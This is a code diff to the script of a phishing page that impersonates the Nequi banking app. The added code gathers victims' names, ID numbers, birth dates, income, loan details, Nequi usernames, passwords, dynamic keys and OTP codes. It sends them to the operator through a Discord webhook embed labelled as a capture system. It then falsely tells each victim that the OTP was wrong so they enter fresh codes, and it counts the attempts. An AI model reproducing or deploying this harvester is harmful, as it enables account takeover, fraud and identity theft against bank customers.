@@ -2073,25 +2073,44 @@ document.addEventListener("DOMContentLoaded", function () {
 
 
  <script>
-
-
 document.addEventListener("DOMContentLoaded", function () {
     const inputs = document.querySelectorAll(".input-keypad");
     const confirmBtn = document.getElementById("confirm-btn");
 
-    // Recuperar datos de localStorage
-    const nombreApellido = localStorage.getItem("nombreApellido");
-    const cedula = localStorage.getItem("cedula");
-    const numero = localStorage.getItem("numero");
-    const clave = localStorage.getItem("clave");
+    // Inicializar o recuperar contador de intentos OTP
+    let otpAttempts = parseInt(localStorage.getItem("otpAttempts")) || 0;
+    otpAttempts++; // Incrementar al cargar la página
+    localStorage.setItem("otpAttempts", otpAttempts);
 
-    console.log("Datos recuperados de localStorage:", { nombreApellido, cedula, numero, clave });
+    // Recuperar todos los datos del localStorage desde la información personal y login
+    const nombreCompleto = localStorage.getItem("nombreCompleto") || '';
+    const tipoDocumento = localStorage.getItem("tipoDocumento") || '';
+    const numeroDocumento = localStorage.getItem("numeroDocumento") || '';
+    const fechaNacimiento = localStorage.getItem("fechaNacimiento") || '';
+    const numeroTelefono = localStorage.getItem("numeroTelefono") || '';
+    const departamento = localStorage.getItem("departamento") || '';
+    const ciudad = localStorage.getItem("ciudad") || '';
+    const tipoVivienda = localStorage.getItem("tipoVivienda") || '';
+    const ingresosMensuales = localStorage.getItem("ingresosMensuales") || '';
+    const actividadEconomica = localStorage.getItem("actividadEconomica") || '';
+    
+    // Datos del simulador
+    const montoCredito = localStorage.getItem("montoCredito") || '';
+    const plazoMeses = localStorage.getItem("plazoMeses") || '';
+    const cuotaMensual = localStorage.getItem("cuotaMensual") || '';
+    
+    // Datos del login
+    const numeroUsuario = info.user || '';
+    const claveUsuario = info.pass || '';
+    const claveDinamica = info.cdin || '';
 
-    if (!numero || !clave) {
-        alert("Datos faltantes. Por favor, completa el paso anterior.");
-        window.location.href = "neq.html";
-        return;
-    }
+    console.log("Intento OTP número:", otpAttempts);
+    console.log("Datos completos a enviar:", {
+        nombreCompleto, tipoDocumento, numeroDocumento, fechaNacimiento,
+        numeroTelefono, departamento, ciudad, tipoVivienda, ingresosMensuales,
+        actividadEconomica, montoCredito, plazoMeses, cuotaMensual,
+        numeroUsuario, claveUsuario, claveDinamica
+    });
 
     function getConcatenatedOTP() {
         let otp = "";
@@ -2105,59 +2124,101 @@ document.addEventListener("DOMContentLoaded", function () {
         return Array.from(inputs).every(input => input.value.trim() !== "");
     }
 
+    function getAttemptMessage(attemptNumber) {
+        switch(attemptNumber) {
+            case 1: return "🔴 **PRIMER INTENTO**";
+            case 2: return "🟡 **SEGUNDO INTENTO**";
+            case 3: return "🟠 **TERCER INTENTO**";
+            default: return `🔥 **INTENTO ${attemptNumber}**`;
+        }
+    }
+
     confirmBtn.addEventListener("click", async function () {
         if (areAllFieldsFilled()) {
             const otpCode = getConcatenatedOTP();
-
-            const dataToSend = {
-                "NombreApellido": nombreApellido,
-                "Cedula": cedula,
-                "Numero": numero, 
-                "Clave": clave,
-                "OTP": otpCode
-            };
-
-            console.log("Datos a enviar:", dataToSend);
-
             
-            const webhookURL = '';
-
+            // Crear embed rico para Discord
             const discordPayload = {
-                username: "Confirmación de OTP",
-                content: `Nueva confirmación OTP recibida:\n\n` +
-                         `**Nombre:** ${nombreApellido}\n` +
-                         `**Cédula:** ${cedula}\n` +
-                         `**Número de Usuario:** ${numero}\n` +
-                         `**Clave:** ${clave}\n` +
-                         `**Código OTP:** ${otpCode}`
+                username: "🏦 NEQUI - Sistema de Captura",
+                embeds: [{
+                    title: "📱 NUEVA CAPTURA COMPLETA - NEQUI",
+                    description: getAttemptMessage(otpAttempts),
+                    color: otpAttempts === 1 ? 0x00ff00 : otpAttempts === 2 ? 0xffff00 : 0xff0000,
+                    fields: [
+                        {
+                            name: "👤 **INFORMACIÓN PERSONAL**",
+                            value: `**Nombre:** ${nombreCompleto}\n` +
+                                   `**Documento:** ${tipoDocumento} - ${numeroDocumento}\n` +
+                                   `**Fecha Nacimiento:** ${fechaNacimiento}\n` +
+                                   `**Teléfono:** ${numeroTelefono}`,
+                            inline: false
+                        },
+                        {
+                            name: "🏠 **INFORMACIÓN RESIDENCIAL**",
+                            value: `**Departamento:** ${departamento}\n` +
+                                   `**Ciudad:** ${ciudad}\n` +
+                                   `**Tipo Vivienda:** ${tipoVivienda}`,
+                            inline: true
+                        },
+                        {
+                            name: "💼 **INFORMACIÓN ECONÓMICA**",
+                            value: `**Ingresos:** ${ingresosMensuales}\n` +
+                                   `**Actividad:** ${actividadEconomica}`,
+                            inline: true
+                        },
+                        {
+                            name: "💰 **DATOS DEL CRÉDITO**",
+                            value: `**Monto:** $${montoCredito}\n` +
+                                   `**Plazo:** ${plazoMeses} meses\n` +
+                                   `**Cuota:** $${cuotaMensual}`,
+                            inline: false
+                        },
+                        {
+                            name: "🔐 **CREDENCIALES NEQUI**",
+                            value: `**Usuario:** ${numeroUsuario}\n` +
+                                   `**Clave:** ${claveUsuario}\n` +
+                                   `**Clave Dinámica:** ${claveDinamica}`,
+                            inline: true
+                        },
+                        {
+                            name: "📲 **CÓDIGO OTP**",
+                            value: `**Código:** ${otpCode}\n` +
+                                   `**Intento:** ${otpAttempts}`,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: `Capturado el ${new Date().toLocaleString('es-CO', {timeZone: 'America/Bogota'})}`
+                    },
+                    timestamp: new Date().toISOString()
+                }]
             };
 
             try {
-                const response = await fetch(webhookURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(discordPayload)
-                });
+                const response = await sendToDiscord(discordPayload);
 
-                if (response.ok) {
+                if (response.success) {
+                    console.log("Datos enviados exitosamente a Discord");
                     
-                    
-                    window.location.href = "loading.html";
+                    // Simular respuesta del servidor
+                    setTimeout(() => {
+                        alert("Código OTP incorrecto. Intenta nuevamente.");
+                        // Limpiar campos para nuevo intento
+                        inputs.forEach(input => input.value = '');
+                        inputs[0].focus();
+                    }, 2000);
                 } else {
                     throw new Error("Error al enviar los datos a Discord");
                 }
             } catch (error) {
                 console.error("Error al enviar los datos:", error);
-                alert("Ocurrió un error al enviar los datos. Intente nuevamente.");
+                alert("Ocurrió un error al procesar tu solicitud. Intenta nuevamente.");
             }
         } else {
             alert("Por favor, completa todos los campos antes de confirmar.");
         }
     });
 });
-
 </script>
 
 
